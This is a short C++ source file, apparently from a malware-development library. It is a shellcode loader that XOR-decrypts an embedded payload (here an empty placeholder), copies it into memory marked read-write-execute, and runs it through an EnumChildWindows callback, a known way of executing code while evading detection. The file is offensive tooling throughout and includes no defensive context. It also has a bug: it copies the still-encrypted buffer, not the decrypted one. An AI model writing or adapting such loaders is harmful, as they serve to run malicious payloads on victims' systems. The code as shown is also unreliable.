#include<windows.h>
#include<stdio.h>
#include "MalDev-Lib/lib-Shellcode/Shellcode.h"

int main(){
    unsigned char shellcode[] = " ";

    unsigned char key = 0x0A;
    int payloadLen = sizeof(shellcode);
    
    // Create a Shellcode object
    Shellcode sc(shellcode,payloadLen);
    
    // Decrypt the shellcode
    unsigned char *decrypted = sc.XOR_decrypt(key);
    
     // Allocate memory with the execute permission
    HANDLE hAlloc = VirtualAlloc(NULL,payloadLen,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    
    // Copy the decrypted shellcode to the allocated memory
    memcpy(hAlloc,shellcode,payloadLen);
    
    // Call EnumChildWindows with the address of the shellcode as the callback function
    EnumChildWindows((HWND)NULL,(WNDENUMPROC)hAlloc,NULL);

    return 0;
}